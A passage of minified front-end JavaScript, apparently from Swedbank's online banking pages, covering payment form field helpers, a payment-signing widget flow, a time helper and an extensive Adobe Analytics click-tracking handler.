element=$("#"+containerSelector+"\\.countryCodeUiField");isRequired?element.attr("required","true"):element.removeAttr("required")},this.setDetailedAddressCurtainsOpen=function(value){const element=$("#"+containerSelector+"\\.curtain")[0];element&&element.open!==value&&(element.open=value)},this.hide=function(){type.val(""),$(radio[0]).prop("checked",!0),container.hide()},this.hasAnyValues=function(){return!isEmpty(country.val())||this.hasStructuredValues()||this.hasUnStructuredValues()},this.hasStructuredValues=function(){return this.hasStructuredMandatoryValues()||this.hasStructuredOptionalValues()},this.hasStructuredMandatoryValues=function(){return!isEmpty(town.val())},this.hasStructuredOptionalValues=function(){return!(isEmpty(province.val())&&isEmpty(districtName.val())&&isEmpty(townLocationName.val())&&isEmpty(street.val())&&isEmpty(houseNumber.val())&&isEmpty(apartmentNumber.val())&&isEmpty(floor.val())&&isEmpty(houseName.val())&&isEmpty(department.val())&&isEmpty(subDepartment.val())&&isEmpty(postBox.val())&&isEmpty(postCode.val()))},this.hasUnStructuredValues=function(){return!isEmpty(address.val())||!isEmpty(addressLine1.val())||!isEmpty(addressLine2.val())},this.isBankPostAddress=function(){return!isEmpty(togglerType)&&(bankType_CREDITOR_BANK===togglerType||bankType_CORRESPONDENT_BANK===togglerType||bankType_INTERMEDIARY_BANK===togglerType)},this.modifyAddressLineMaxLength=function(maxLen){$("#"+containerSelector+"\\.address").attr("maxlength",maxLen)},this.setIsDestinationWorldwide=function(value){isDestinationWorldwide=value},this.setIsUrgent=function(value){isUrgent=value},this.isDestinationWorldwide=function(){return isDestinationWorldwide},this.getCountry=function(){return country},this.getAddress=function(){return address},this.getAddressLine1=function(){return addressLine1},this.getAddressLine2=function(){return addressLine2}},FormHelper:FormHelper,ForeignSepaExtraFieldsToggler:ForeignSepaExtraFieldsToggler,DomesticSepaExtraFieldsTogglerLT:DomesticSepaExtraFieldsTogglerLT,DomesticSepaExtraFieldsTogglerLV:DomesticSepaExtraFieldsTogglerLV,DomesticSepaExtraFieldsTogglerEE:DomesticSepaExtraFieldsTogglerEE,Validation:Validation,DetailsChooser:function(options){const typeOfRemittanceInfo=options.typeOfRemittanceInfo,details=options.details,creditorReference=options.creditorReference,creditorIssuer=options.creditorIssuer,row=function(field){return field.closest("dd").add(field.closest("dd").prev("dt"))};this.setType=function(type){"disabled"!==$(typeOfRemittanceInfo).attr("disabled")&&($(typeOfRemittanceInfo).filter("input[value="+type+"]").prop("checked",!0),typeOfRemittanceInfo.trigger("change"))},this.setValue=function(detailsVal,creditorReferenceVal){"disabled"!==$(typeOfRemittanceInfo).attr("disabled")&&(details.val(detailsVal),creditorReference.val(creditorReferenceVal),creditorReferenceVal?this.setType("creditorReference"):this.setType("details"))},this.disableChoosing=function(){$(typeOfRemittanceInfo).prop("disabled",!0)},this.enableChoosing=function(){$(typeOfRemittanceInfo).prop("disabled",!1)},$(typeOfRemittanceInfo).on("change",(function(){const type=$(typeOfRemittanceInfo).filter("input[type=radio]:checked").val();"details"===type?(creditorReference.val(""),row(creditorReference).hide(),creditorIssuer&&(creditorIssuer.val(""),row(creditorIssuer).hide()),row(details).show()):"creditorReference"===type&&(row(creditorReference).show(),creditorIssuer&&row(creditorIssuer).show(),details.val(""),row(details).hide())})),typeOfRemittanceInfo.trigger("change")},UICurtainExtraFieldsToggler:UICurtainExtraFieldsToggler,ExtraFieldsToggler:ExtraFieldsToggler,CreditorAddressFieldsToggler:CreditorAddressFieldsToggler}}}(jQuery);var divs=["forwardButtons","downloadPdf"];function showElements(){var args=Array.prototype.slice.call(arguments);divs.forEach((function(id){jQuery("#"+id).toggle(args.includes(id))}))}function disableExecuteButton(){toggleExecuteButton(!1)}function toggleExecuteButton(flag){jQuery("#executeButton").prop("disabled",!flag).toggleClass("disabled",!flag).toggleClass("positive",flag)}function getSignMethod(){var $signMethod=document.getElementById("signMethod");return{name:$signMethod&&$signMethod.value?$signMethod.value:"sign"}}function addOnClickToElement(element,method){document.querySelector("#"+element).on("click",method)}function selectConfirmationType(customSubmitFields){document.querySelector("#ddcontrol").show(),UI.focusInteractiveElement(document.querySelector("#mainForm")),addOnClickToElement("executeButton",(function(){Swedbank.Signing.initSigningProcess(customSubmitFields)}))}function downloadFile(type,targetControlId,customSubmitFields){Swedbank.Signing.generateFileDownloadForm(targetControlId),void 0!==customSubmitFields&&customSubmitFields.size()>0&&copyOrSetFields("mainForm","downloadForm",customSubmitFields);var form=document.downloadForm;form.downloadDate.value=(new Date).getTime(),form.downloadFile.value=type,form.setAttribute("target","_blank"),beforeSubmitHandler(form)&&submitDownloadForm()}function submitDownloadForm(){document.downloadForm.submit()}function paymentAmountsMatch(expected,actual){return(expected=Number(expected.replace(",",".").replace(/\s/g,"")))==(actual=Number(actual.replace(",",".").replace(/\s/g,"")))}function Slider(selector,options){if(jQuery(selector).data("sliderinstance"))return jQuery(selector).data("sliderinstance");this.callbacks={slide:[],slidechange:[]},this.$element=jQuery(selector).data("sliderinstance",this),this.options=jQuery.extend({},Slider.defaultOptions,this.$element.data(),options),!0===this.options.range?this.options.values=this.options.initialValue?String(this.options.initialValue).split(","):[this.options.min,this.options.max]:this.options.value=null===this.options.initialValue?this.options.min:this.options.initialValue,this.renderContainer(),this.createStepper(),this.options.rangeMarkers&&this.renderRangeMarkers(),this.options.lim&&this.createAdditionalLimit(),this.options.limLabel&&this.createAdditionalLimitLabel(),this.initialize()}Swedbank.Signing={actions:{"#signingPositiveActions":[],"#signingNegativeActions":[]},config:null,labels:null},function($){var Signing=Swedbank.Signing;Signing.appendSigningFormTo=function($target){Signing.createSigningButtonsBar().appendTo($target),Signing.createLoaderIndicator().add(Signing.createExecuteButton()).appendAsListItemTo("#signingPositiveActions");const signingResetCallback=()=>{Signing.resetActions(),window.signingAllowed=void 0},signingInitActionsCallback=()=>{Object.entries(Swedbank.Signing.actions).forEach((([container,array])=>{array.forEach(($action=>$action.prependAsListItemTo(container)))}))};Swedbank.isUiSpaEnabled?(SharedComponents.eventBus.addEventListener("spa-navigation-start",signingResetCallback),SharedComponents.eventBus.addEventListener("spa-navigation-complete",signingInitActionsCallback),signingInitActionsCallback()):(Swedbank.PageLoad.onEachUnload(signingResetCallback),Swedbank.PageLoad.onEach(signingInitActionsCallback))},Signing.createLoaderIndicator=function(){return $('<div id="buttonLoaderAnimation" style="display: none;">  <img id="widgetLoaderAnimation" src="/shared/graphics/payments/grayIndicator.gif"/></div>')},Signing.createSigningButtonsBar=function(){return $('<div id="forwardButtons" class="form-button-bar"> <ul id="signingNegativeActions"/> <ul id="signingPositiveActions"/></div>')},Signing.createAndRememberAction=function(action,label,pageId,clazz,selector,confirmation){confirmation=void 0!==confirmation&&confirmation;var $action=Swedbank.Templates.action({class:clazz,text:label,type:"button"},action,pageId,confirmation);return Signing.actions[selector].unshift($action),$action},Signing.resetActions=function(){Signing.actions={"#signingPositiveActions":[],"#signingNegativeActions":[]}},Signing.addPositiveAction=function(action,label,pageId,confirmation){return confirmation=void 0!==confirmation&&confirmation,Signing.createAndRememberAction(action,label,pageId,"positive","#signingPositiveActions",confirmation)},Signing.addNeutralAction=function(action,label,pageId,confirmation){return confirmation=void 0!==confirmation&&confirmation,Signing.createAndRememberAction(action,label,pageId,"-guiding","#signingPositiveActions",confirmation)},Signing.addNegativeAction=function(action,label,pageId,confirmation){return confirmation=void 0!==confirmation&&confirmation,label=label||Signing.labels.btnBack,Signing.createAndRememberAction(action,label,pageId,"-destructive","#signingNegativeActions",confirmation)},Signing.addNegativeBackAction=function(action,label,pageId,confirmation){return confirmation=void 0!==confirmation&&confirmation,label=label||Signing.labels.btnBack,Signing.createAndRememberAction(action,label,pageId,"-destructive back","#signingNegativeActions",confirmation)},Signing.createExecuteButton=function(){var $executeButtonContainer=$('<span id="ddcontrol" style="display:none"/>');return Swedbank.Templates.action({id:"executeButton",class:"positive signing-button-offset",text:Signing.config.confirmationMethod.buttonText,type:"button"}).appendTo($executeButtonContainer),$executeButtonContainer},Signing.generateFileDownloadForm=function(targetControlId){Swedbank.Forms.generateAdditionalForm("downloadForm",{downloadFile:!0,downloadDate:""},{targetControlId:targetControlId})},Signing.initSigningProcess=function(customSubmitFields){var signingWidget=document.querySelector("signing-widget"),forwardButtons=document.querySelector("#forwardButtons"),executeButton=document.querySelector("#executeButton");function handleSigningCanceled(e){SharedComponents.loader.toggleLoaderInButton(executeButton,!1,{disabled:!1}),forwardButtons.show(),unsubscribe()}function handleSigningCompleted(e){unsubscribe(),linkAction(null,getSignMethod().name,"true")}function handleSigningFailed(e){var error=e.detail;ErrorMessage.add(error),ErrorMessage.scrollTo(),SharedComponents.loader.toggleLoaderInButton(executeButton,!1,{disabled:!1}),forwardButtons.show(),unsubscribe()}function unsubscribe(){signingWidget.removeEventListener("signing-completed",handleSigningCompleted),signingWidget.removeEventListener("signing-canceled",handleSigningCanceled),signingWidget.removeEventListener("signing-failed",handleSigningFailed)}SharedComponents.loader.toggleLoaderInButton(executeButton,!0,{disabled:!0}),signingWidget.addEventListener("signing-completed",handleSigningCompleted),signingWidget.addEventListener("signing-canceled",handleSigningCanceled),signingWidget.addEventListener("signing-failed",handleSigningFailed),ErrorMessage.clear(),"function"!=typeof signingAllowed||signingAllowed()?(forwardButtons.hide(),signingWidget.sign(null,function getCustomParams(fields){var customParams={};if("function"==typeof(fields=fields||[])&&(fields=fields()),Array.isArray(fields)){var formFields=SharedComponents.UIField.prototype.getData.call(document.getElementById("mainForm"));customParams=fields.reduce((function(result,field){return formFields.hasOwnProperty(field)&&(result[field]=formFields[field]),result}),Object.assign({},customParams))}else fields&&(customParams=Object.assign({},customParams,fields));return customParams}(customSubmitFields))):(ErrorMessage.add(Swedbank.Signing.labels.signingNotAllowedError),ErrorMessage.scrollTo(),SharedComponents.loader.toggleLoaderInButton(executeButton,!1,{disabled:!1}),forwardButtons.show(),unsubscribe())}}(jQuery),Swedbank.Time=class{static get now(){const m=moment();let diff=m.valueOf()-Swedbank.Time.serverTime;return diff<0&&(diff=0),moment(m.valueOf()+diff)}static get labels(){return this._labels||{}}static set labels(o){this._labels=o}static showDateSensitiveContent(){const format=moment.defaultFormat+" HH:mm:ss";document.mainForm.querySelectorAll("[data-visible-from], [data-visible-until]").forEach((elem=>{const minDate=moment(elem.dataset.visibleFrom||Swedbank.Time.now,format),maxDate=moment(elem.dataset.visibleUntil||Swedbank.Time.now,format),afterMinDate=Swedbank.Time.now.valueOf()>=minDate.valueOf(),beforeMaxDate=Swedbank.Time.now.valueOf()<=maxDate.valueOf(),timeFormat=/^\d{2}:\d{2}(:\d{2})?$/;let timeAllowed=!1;if(timeFormat.test(elem.dataset.visibleFrom)&&timeFormat.test(elem.dataset.visibleUntil)){const from=moment();from.hour(elem.dataset.visibleFrom.split(":")[0]),from.minute(elem.dataset.visibleFrom.split(":")[1]),from.second(0);const until=moment();until.hour(elem.dataset.visibleUntil.split(":")[0]),until.minute(elem.dataset.visibleUntil.split(":")[1]),until.second(0),timeAllowed=Swedbank.Time.now.valueOf()>=from.valueOf()&&Swedbank.Time.now.valueOf()<=until.valueOf()}elem.classList.toggle("-hidden",!(afterMinDate&&beforeMaxDate||timeAllowed))}))}},Swedbank.isUiSpaEnabled||Swedbank.PageLoad.onEach(Swedbank.Time.showDateSensitiveContent),jQuery((function($){function elementTriggersFlowAction($element){href=$element.attr("href"),id=$element.attr("id"),$element.is("#startChat, #chat-launcher > div > a")&&href.includes("startChat()")&&(Swedbank.AdobeTracking.chatFlowTracking("live-chat","liveChatStart"),setTimeout((function(){$("#chat-exceptions-container").is(":visible")?Swedbank.AdobeTracking.chatFlowTracking("live-chat","liveChatCannotStart"):$("#chatAgentsBusySection").is(":visible")&&Swedbank.AdobeTracking.chatFlowTracking("live-chat","liveChatBusy")}),3e3))}function getBannerIdentifier(event){var element=$(event.target),identifier="",campaignVisuals={campaignVisual:element.closest('.campaign-visual, ui-offer[layout="introduction"]').next("span.wt-link-banner").attr("id"),offerVisualOne:element.closest('.offer, ui-offer[layout="personal"]').next("span.wt-link-banner, span.csp-wt-span").attr("id"),salesRibbonOne:element.closest("ui-salesribbon").siblings("span.wt-link-banner").attr("id"),salesRibbonTwo:element.closest("ui-salesribbon").find("span.wt-link-banner").attr("id"),multipleOffers:element.closest(".offer-container, ui-product").next("span.wt-link-banner, span.csp-wt-span").attr("id"),frontPageColumnsLT:element.closest('section.frame div.clickable, ui-column, div[class^="col"]').children(":first").next("span.wt-link-banner").attr("id"),frontPageColumnsEELV:element.closest("section.frame div.clickable, ui-column").children(":first").next("span.wt-link-news").attr("id"),relatedProductsOffer:element.closest(".calculator").next("span.wt-link-banner").attr("id"),calculatorOffer:element.closest(".calculator, ui-calculator").next("span.wt-link-banner").attr("id"),cardsOffer:element.closest("ui-offer > section.frame").next("span.wt-link-banner").attr("id"),offerVisualTwo:element.closest(".offer").find("span.wt-link-banner").attr("id"),offerWithScript:element.closest("ui-offer").next("script").next("span.wt-link-banner").attr("id"),webinarRegistration:element.closest("ui-webinar-registration").next("span.wt-link-banner").attr("id"),infoboxoffer:element.closest("ui-infobox").next("span.wt-link-banner").attr("id"),offersInViews:element.closest("ui-views").nextAll("span:first").attr("id")};return $.each(campaignVisuals,(function(type,expression){if(expression)return identifier=expression,!1})),identifier}function getTargetGroupName(groupType,$element){var groupName="";switch(groupType.split(":").pop()){case"tab-content":case"bell-notification":groupName=$element.closest("li").attr("data-content-type")||"";break;case"curtain-list":var curtainList=$element.closest("ul.curtains, ui-curtains"),curtainSection=curtainList.parent().is("section.frame")?curtainList.parent():"";""!==curtainSection&&(groupName=curtainSection.attr("data-wt-label")||curtainSection.attr("id")||"");break;case"video-link":clickName=wtAttribute||elementId||$element.parents("ui-video").attr("src")||"",clickStatus=href;break;case"modal":var modalContainer=$element.closest(".modal-window, ui-modal"),modalType=modalContainer.attr("type")||"",modalName=modalContainer.attr("data-wt-label")||modalContainer.attr("id")||"";groupName=modalType?modalType+":"+(modalName||"no-label"):modalName||"";break;case"clickable-cards":groupName=$element.closest("ui-awards").attr("id")||"";break;case"customer-feedback":groupName=$element.closest("ui-feedback").attr("id")||"";break;case"calculator":calculator=$element.closest(".calculator, ui-calculator"),groupName=calculator.attr("data-wt-label")||calculator.attr("id")||"";break;case"top-menu":var topMenuRef=$element.closest("ui-navlist").attr("ref")||"",topMenuLabel=$element.closest("ui-navlist-menu").attr("label-id")||"";if(topMenuRef&&topMenuLabel){var regex=/\W+/g;groupName=topMenuRef.replace(regex,"-")+":"+topMenuLabel.replace(regex,"-").toLowerCase()}break;default:groupName=""}return groupName}function trackingHandler(event){if(void 0===event.isTrigger||"slidechange"===event.type){var adobeHrefProperty,evtTarget=$(event.target),$element=$(this),tagName=$(this).prop("tagName").toLowerCase(),isWebComponent=!!customElements.get(tagName)||$element.is('[class^="ui-"]'),elementId=$element.attr("id"),wtAttribute=$element.attr("data-wt-label"),href=$element.attr("href")||"",onclick=$element.attr("onclick")||"",targetType=function getTargetType($element,event){var href=$element.attr("href")||"",targetType=($element.attr("onclick"),""),eventTargetTypes={click:{file:["pdf","doc","docx","xls","xlsx","ppt","pptx"].includes(href.split(".").pop()),news:$element.is("a.wt-link-news"),modal:href.includes("Swedbank.Modals.")||href.includes("Swedbank.UIModals.")||href.includes("openCalculatorModal"),"va-bubble":$element.is("button")&&"dialog"===$element.children("ui-icon").attr("glyph"),"va-chatbox":$element.is("button")&&$element.parents("#virtual-assistant-chat").length>0,button:$element.is(":button, .button")&&!$element.is("th.sort button, ui-video button, .-iconed, ui-navtoggle button"),"icon-button":$element.is("button.-iconed"),"curtain-header":$element.is('h3[class*="curtain-head"], ui-curtain[layout!="spoiler"] > h3'),tab:$element.is(".tabsList a, .ui-tabs__caption"),image:$element.is("a")&&function(){return $element[0].children.length>0&&[].every.call($element[0].children,(el=>"img"===el.localName))},"related-product":$element.parents(".related-products-list, ui-products").length>0,"spoiler-toggle":$element.is('ui-curtain[layout="spoiler"] > h3 div[class$="content"]'),tooltip:"","virtual-assistance-link":$element.is("a")&&$element.parents("#virtual-assistant-chat").length>0,"top-bar-item":$element.parents("header").length>0&&!$element.parents(".user-assist-panel").length>0,"nav-primary-item":$element.is('ui-navitem[type^="primary-"] > a'),"nav-secondary-item":$element.is('ui-navitem[type="secondary-item"] > a'),"nav-third-item":$element.is('ui-navitem[type="auxiliary-item"] > a'),"form-step-icon":$element.is("ol.form-steps a"),"video-link":$element.is('a[class^="ui-video"], button[class^="ui-video"]'),column:$element.is(".columns .clickable, ui-card a"),"info-box":$element.is("ui-infobox a"),icon:$element.is('span[class^="ico -"], ui-icon'),chip:$element.is('ui-caption[layout="chip"]'),sorter:$element.is("th.sort button, th a.sort"),"clickable-card":$element.is("ui-award")},change:{checkbox:$element.is(":checkbox"),radio:$element.is(":radio"),tab:$element.is("select")&&$element.parents("ui-tabs").length>0,dropdown:$element.is("select"),switch:$element.is(".toggle"),slider:$element.is("ui-slider"),inputfield:$element.is('input[type="text"], input[type="number"], input[type="tel"], input[type="email"]')&&!$element.is("[disabled]")},slidechange:{slider:$element.is(".slider-container")},mousedown:{"chatbox-controller":$element.is("input.-button")&&$element.parent().is('li[class*="header-control"]')}};return $.each(eventTargetTypes[event.type],(function(type,expression){if($.isFunction(expression)&&!0===expression()||!0===expression)return targetType=type,!1})),""===targetType&&""!==href&&"mousedown"!==event.type&&(targetType="link"),targetType}($element,event),groupType=function getTargetGroup(event,targetType){var element=$(event.target),groupType="";elementGroupTypes={modal:element.parents("div.modal-window, ui-modal").length>0,tabs:element.parents("ui-tabs, .tabsList").length>0,"tab-content":element.parents("ui-tabs ui-views ui-tab, .tabsContent > div").length>0,"curtain-list":element.parents("ul.curtains, ui-curtains").length>0,curtain:element.parents('.curtain, ui-curtain[layout!="spoiler"]').length>0,calculator:element.closest(".calculator, ui-calculator").length>0,form:element.parents(".form-content").length>0||"form-step-icon"===targetType,"bell-notifications":element.parents("ul.notification-rows").length>0||element.siblings("ui-modal ul.notification-rows").length>0,"comparison-table":element.parents('.comparison-table, ui-table[plugins*="comparison"]').length>0,"regular-table":element.parents(".default-table ,ui-table").length>0,"introduction-visual":element.parents('.campaign-visual, section#intro-section, ui-offer[layout="introduction"]').length>0,"offer-visual":element.parents('.offer, ui-offer[layout="personal"]').length>0,"bell-notification":element.parents("ul.notification-rows > li").length>0,"virtual-assistant":element.parents("va-chatbox").length>0,"top-bar":element.parents("header").length>0&&0==element.parents(".nav-columns.-secondary").length,"top-menu":"nav-primary-item"===targetType||"nav-secondary-item"===targetType||"nav-third-item"===targetType,"login-container":element.parents("form#loginForm").length>0,"related-products":"related-product"==targetType,footer:element.parents("footer").length>0,ribbon:element.parents("ui-salesribbon").length>0,"info-message":element.parents('.infoMsg, ui-message[type="info"]').length>0,"warning-message":element.parents('.warningMsg, ui-message[type="warning"]').length>0,"success-message":element.parents('.successMsg, ui-message[type="success"]').length>0,"urgent-message":element.parents('.urgentMsg, ui-message[type="urgent"]').length>0,"regular-chat":element.parents("div#chat").length>0,"top-bar-hidden-content":element.parents(".user-assist-panel").length>0,"clickable-cards":element.parents("ui-awards").length>0,columns:element.parents("ui-columns, .columns").length>0,cookieprompt:element.is("ui-cookieprompt button"),"customer-feedback":element.parents("ui-feedback").length>0};var topLevelGroups=["modal","form","curtain-list","curtain","columns","tabs","tab-content","bell-notifications"];return $.each(elementGroupTypes,(function(type,expression){if(($.isFunction(expression)&&!0===expression()||!0===expression)&&(groupType=""===groupType?type:groupType+":"+type,!topLevelGroups.includes(type)))return!1})),getBannerIdentifier(event)?groupType+(""!=groupType?":":"")+"internal-campaign":groupType}(event,targetType),groupNameValue=getTargetGroupName(groupType.split(":").pop(),evtTarget),clickName="",clickStatus="",adobeLinkType="o",sendAfterNextPageLoad=function getSendAfterNextPageLoad($element){var href=$element.attr("href")||"",onclick=$element.attr("onclick")||"",sendAfterNextPageLoad=href.startsWith("/")&&!href.endsWith(".pdf")&&!href.endsWith(".xls")||href.includes("navigateTo")||href.includes("linkAction")||onclick.includes("navigateTo")||onclick.includes("linkAction")||href.includes("submitSliderLoanApp")||onclick.includes("switchLanguage");return Swedbank.Navigation.pageId.endsWith("eservices")&&(sendAfterNextPageLoad=!1),sendAfterNextPageLoad}($element),externalHref=sendAfterNextPageLoad||href.includes("javascript:")?"":href;switch(sendAfterNextPageLoad||(adobeHrefProperty="true"),targetType){case"button":""===(clickName=wtAttribute||elementId||(sendAfterNextPageLoad?"":href)||onclick)&&$element.is(".-back, .-next")?clickName=$element.is(".-back")?"back":"next":clickName.includes("navigateTo")?clickName="direct-to:"+clickName.split("'")[1]:clickName.includes("Hansa.loginbar.forcedLogin")?clickName="forced-login-toggle":$element.is(".ui-wizard__link")?clickName="wizard-navigation-step-"+$element.attr("data-step-id"):clickName===onclick&&(clickName=""),elementTriggersFlowAction(evtTarget);break;case"icon-button":clickName=$element.find("ui-icon").attr("glyph")||"";break;case"tab":var tabsContainer=$element.closest("ul.ui-tabs__captions, ul.tabsList, ui-field.ui-tabs__dropdown"),tabsList=$element.closest("ul.ui-tabs__captions, ul.tabsList").find("li"),tabParent=isWebComponent?$element:$element.parents("li"),tabIndex=$element.is("select")?$element.prop("selectedIndex"):tabsList.index(tabParent),uiViewTabs=tabsContainer.next().is("ui-views")?tabsContainer.next().children("ui-tab"):[],uiViewTab=$(uiViewTabs[tabIndex]);clickName=tabParent.find("a").attr("data-wt-label")||uiViewTab.attr("data-wt-label")||tabParent.attr("id")||tabsContainer.siblings("ui-views").find("ui-tab").not(".-hidden").attr("data-wt-label")||"",clickStatus="tab"+(tabIndex+1);break;case"slider":var sliderElement=$element.find(".slider-component, input.ui-slider__control");clickName=wtAttribute||elementId||sliderElement.attr("id")||sliderElement.attr("data-wt-label")||"";break;case"inputfield":clickName=wtAttribute||elementId;break;case"dropdown":clickName=wtAttribute||elementId||$element.attr("name")||"",clickStatus=$element.val();break;case"switch":case"checkbox":case"radio":clickName=elementId||$element.attr("name"),clickStatus=$element.is(":checked")?"checked":"unchecked";break;case"related-product":clickName=$element.find(":header[data-wt-label]").attr("data-wt-label")||wtAttribute||$element.attr("page-id")||evtTarget.attr("href")||"";break;case"file":clickStatus="filetype:"+(clickName=href.split("/").last()).split(".").last(),adobeLinkType="d";break;case"nav-primary-item":case"nav-secondary-item":case"nav-third-item":var glyph=$element.is('ui-navitem[type$="-icon"] > a')?$element.find("ui-icon").attr("glyph"):"";(clickName=wtAttribute||$element.parent().attr("data-wt-label")||elementId||glyph||"").toLowerCase();break;case"form-step-icon":clickName="agreementStep"+(evtTarget.closest("ol.form-steps").find("li").index(evtTarget.parent())+1);break;case"curtain-header":case"spoiler-toggle":var curtains=$element.closest('ul[class*="curtains"], ui-curtains').find('h3[class*="curtain-head"], ui-curtain h3'),curtain=$element.parent();clickName=wtAttribute||elementId||curtain.attr("data-wt-label")||curtain.attr("id")||"",clickStatus=targetType+"-"+(curtains.index($element)+1),$element.parent().hasClass("-open")||void 0!==$element.closest("ui-curtain").attr("open")?clickStatus+="-open":clickStatus+="-close","spoiler-toggle"!==targetType||clickName||(clickName="read-more/less");break;case"modal":clickName=wtAttribute||elementId||href.split(/[()]/g)[1].split(",")[0].replace(/[']/g,"")||"";break;case"news":case"column":case"info-box":var columnList=$element.closest(".columns, ui-columns").children('[class^="col-"], .clickable, ui-column'),thisColumn=$element.closest('[class^="col-"], .clickable, ui-column');(clickName=thisColumn.closest("a").attr("href")||href||"").includes("navigateTo")?clickName="direct-to:"+clickName.split("'")[1]:href.startsWith("#news=")||(clickName="direct-to:"+clickName),clickStatus="column-"+(columnList.index(thisColumn)+1);break;case"top-bar-item":var parentElement=$element.parent();parentElement.is("ui-navtoggle")?(clickName=parentElement.attr("data-wt-label")||parentElement.attr("for")||"",clickStatus=parentElement.hasClass("-off")?"close":"open"):clickName=wtAttribute||elementId||"";break;case"va-bubble":clickName="va-bubble";break;case"va-chatbox":"va-exit-chat"===$element.attr("data-event")&&Swedbank.AdobeTracking.chatFlowTracking("virtual-assistant","virtualChatUserComplete"),"va-minimize-chat"===$element.attr("data-event")&&(clickName="minimizeToggle",clickStatus="minimize");break;case"virtual-assistance-link":var onClickAttr=$element.attr("onClick")||"";clickStatus=$element.data("vtz-link-type")||"type-undefined",onClickAttr.includes("openVirtualAssistantLink")?clickName=wtAttribute||"link-to:"+$element.attr("onClick").split("'")[1]:onClickAttr.includes("virtualAssistant.startChat")?(clickName="start-chat:"+onClickAttr.split("'")[1],Swedbank.AdobeTracking.chatFlowTracking("live-chat","liveChatStart")):clickName=wtAttribute||elementId||"va-unknown-textlink";break;case"icon":clickName=elementId||wtAttribute||$element.attr("glyph")||$element.attr("class").split(" ")[1].replace("-","")||"";break;case"image":clickName=wtAttribute||elementId||externalHref;break;case"chip":icon=$element.find("ui-icon").attr("glyph")||"",iconLabel=icon?"chip-"+icon+":":"",elementLabel=wtAttribute||elementId||"",clickName=iconLabel||elementLabel?iconLabel+(elementLabel||"no-label"):"";break;case"sorter":clickName=elementId||wtAttribute||$element.parent().attr("data-sort-column")||"",clickStatus=$element.parent().attr("aria-sort")||"";break;case"clickable-card":clickName=$element.attr("data-offer")||$element.attr("data-offer-link")||$element.attr("award-id")||wtAttribute||elementId||"",Swedbank.AdobeTracking.setPartnerOfferData($element),clickStatus=function getUIAwardDataProperties($element){var usedAttributes=[];$element.attr("data-offer")?usedAttributes=["data-preview","data-offer","data-group","price","data-category"]:$element.attr("data-city")&&(usedAttributes=["data-offer-link","data-company","data-city","price"]);var resultAttributeValues=[];for(i=0;i<usedAttributes.length;i++){var attribute=$element.attr(usedAttributes[i])||"";resultAttributeValues.push(attribute.replace(/\s+/g,"-").toLowerCase())}return resultAttributeValues.join(":")}($element);break;default:""!==targetType&&(clickName=wtAttribute||elementId||externalHref)}if(-1!==groupType.indexOf("comparison-table")&&(clickStatus=function getComparisonTableElementRowColLocation($element){var rowList=$element.closest('table.comparison-table, ui-table[plugins*="comparison"]').find("tr:visible"),colList=$element.closest("tr").find("th:visible, td:visible"),parentRow=$element.closest("tr"),parentCol=$element.closest("td"),rowIndex=rowList.index(parentRow)+1,colIndex=colList.index(parentCol)+1;return"row:"+rowIndex+"-col:"+colIndex}(evtTarget)),groupType.split(":").includes("bell-notification")||$element.closest("#nc-notification-list").length>0){var referenceId=$element.closest("li").attr("data-reference-id");clickStatus=referenceId?"referenceId:"+referenceId:""}clickName=function getElementNameBasedOnSurroundingElements($element,targetType,groupType,label){var clickName="",lastGroup=groupType.split(":").pop();if(["introduction-visual","internal-campaign","comparison-table","calculator","ribbon","bell-notification","modal","curtain","offer-visual","regular-table","form"].includes(lastGroup)||-1!==groupType.indexOf("-message")){if("button"===targetType)clickName=$element.is(".-guiding")?lastGroup+"-cta-guiding":$element.is(".-back, .-next, .-destructive")?lastGroup+"-ctrl":lastGroup+"-cta";else if("link"===targetType)clickName=lastGroup+"-textlink";else if("related-product"===targetType)clickName="related-product-offer-textlink";else if("modal"===targetType)clickName=lastGroup+"-modal-link";else if("curtain-header"===targetType){var glyph=$element.find("div > ui-icon").attr("glyph")||"";clickName=lastGroup+(glyph?"-with-icon-"+glyph:"")}else clickName="slider"===targetType?lastGroup+"-slider":lastGroup+"-"+targetType;return clickName+":"+(""===label?"no-label":label)}return""===label&&$element.closest("#nc-notification-list li").length>0?"view":label}($element,targetType,groupType,clickName),""!==targetType&&void 0!==clickName&&(-1!=groupType.indexOf("internal-campaign")&&function setBannerIdentifierInDatalayer(event,isBannerCloseClick){var bannerIdentifier=getBannerIdentifier(event);Swedbank.AdobeTracking.campaignReferral(bannerIdentifier),_dl.marketing.internalCampaignClick=bannerIdentifier,_dl.marketing.internalCampaignActivity=isBannerCloseClick?"internalCampaignClose":"internalCampaignClick"}(event,$element.is(".ui-offer__close-button")),""!==clickName&&function setClickValuesInDatalayer(clickName,clickStatus,targetType,groupType,groupName,hrefPropValue,linkTypeValue){var statusCondition=function(){return!clickStatus.startsWith("referenceId:")};_dl&&(_dl.click={name:Swedbank.AdobeTracking.getStringLargeNumbersMasked(clickName),type:targetType,group:groupType,groupName:Swedbank.AdobeTracking.getStringLargeNumbersMasked(groupName),status:Swedbank.AdobeTracking.getStringLargeNumbersMasked(clickStatus,8,statusCondition),hrefProperty:hrefPropValue,linkType:linkTypeValue,event:{click:"1"}})}(clickName,clickStatus,targetType,groupType,groupNameValue,adobeHrefProperty,adobeLinkType),function triggerClick(){_dl&&_dl.marketing&&_dl.marketing.internalCampaignClick&&_dl.marketing.internalCampaignActivity?(Swedbank.AdobeTracking.track(_dl.marketing.internalCampaignActivity,_dl),_dl.marketing.internalCampaignClick="",_dl.marketing.internalCampaignActivity="",_dl.click={}):_dl&&_dl.click&&0!=Object.keys(_dl.click).length&&(Swedbank.Eventbucket&&Swedbank.Eventbucket.trackClick(_dl.click.type,_dl.click.group,_dl.click.name,"",{status:_dl.click.status}),Swedbank.AdobeTracking.track("click",_dl),_dl.click={})}())}}window._dl=window._dl||{},(Swedbank=Swedbank||{}).AdobeTracking={BANNERS_CSS_CLASSES:".wt-link-banner, span.csp-wt-span, .card + span.wt-link-news, ui-card + span.wt-link-news",SCROLL_DISTANCES:{sc35:!1,sc70:!1},TRACKABLE_ELEMENTS:{click:["a:not(.clickable a):not(ui-product a):not(a.sort)",".clickable","li.wt-link-anchor","img.wt-link-img","h3.curtain-head",'ui-curtain[layout!="spoiler"] > h3',"span.ico","li.ui-tabs__caption",'ui-curtain[layout="spoiler"] > h3 div[class$="content"]',"ui-product","ui-card a","ui-caption","ui-award","th.sort button","th a.sort","ui-icon:not(ui-curtain ui-icon):not(button ui-icon):not(a ui-icon):not(ui-caption ui-icon)",'button:not([class^="ui-slider"]):not(.ui-tabs__control):not([class^="ui-dropdown"]):not(li[class^="ui-dropdown"] 